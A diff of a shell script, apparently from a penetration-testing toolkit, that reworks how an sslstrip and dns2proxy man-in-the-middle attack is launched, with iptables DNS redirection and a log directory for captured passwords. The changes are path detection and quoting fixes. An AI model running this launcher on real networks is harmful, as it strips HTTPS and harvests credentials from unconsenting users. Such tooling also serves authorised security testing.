@@ -29,18 +29,6 @@ f_ip_tables(){
   iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 }
 
-f_version_check(){
-   # Check for Kali1 version for dns2proxy path
-  dpkg --list mana-toolkit | grep -q 0~20140915-0
-  RETCODE=$?
-
-  if [ $RETCODE -eq 0 ]; then
-  dns2proxy_path=/usr/share/mana-toolkit/sslstrip-hsts
-  else
-  dns2proxy_path=/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy
-  fi
-}
-
 f_run(){
   # Path to sslstrip definitions
   printf "\nLogs saved to ${LOGDIR}\n\n"
@@ -54,19 +42,25 @@ f_run(){
 
   logfile="${LOGDIR}"/sslstrip_$(date +%F-%H%M).log
 
-  if [ -f $dns2proxy_path/dns2proxy.py ]; then
-    cd $dns2proxy_path
-    python $dns2proxy_path/dns2proxy.py $interface > /dev/null 2>&1 &
+  if [ -r "/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy" ]; then
+    dns2proxy_path=/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy
+  else
+    dns2proxy_path=/usr/share/mana-toolkit/sslstrip-hsts
+  fi
+
+  if [ -r "${dns2proxy_path}/dns2proxy.py" ]; then
+    cd "${dns2proxy_path}"
+    python "${dns2proxy_path}/dns2proxy.py" ${interface} > /dev/null 2>&1 &
     printf "dns2proxy by LeonardoNVE is running...\n"
   else
     printf "dns2proxy is currently unavailable\n"
   fi
-  /usr/bin/sslstrip -pfk -w $logfile -l 8888 $interface > /dev/null 2>&1 &
+  /usr/bin/sslstrip -pfk -w "${logfile}" -l 8888 ${interface} > /dev/null 2>&1 &
   printf "sslstrip 0.9 by Moxie Marlinespike running...\n"
   printf "tailing log file, ^c to quit and shut down attack.\n"
 
   sleep 3
-  tail -f $logfile
+  tail -f "${logfile}"
 }
 
 LOGDIR="/opt/pwnix/captures/passwords"
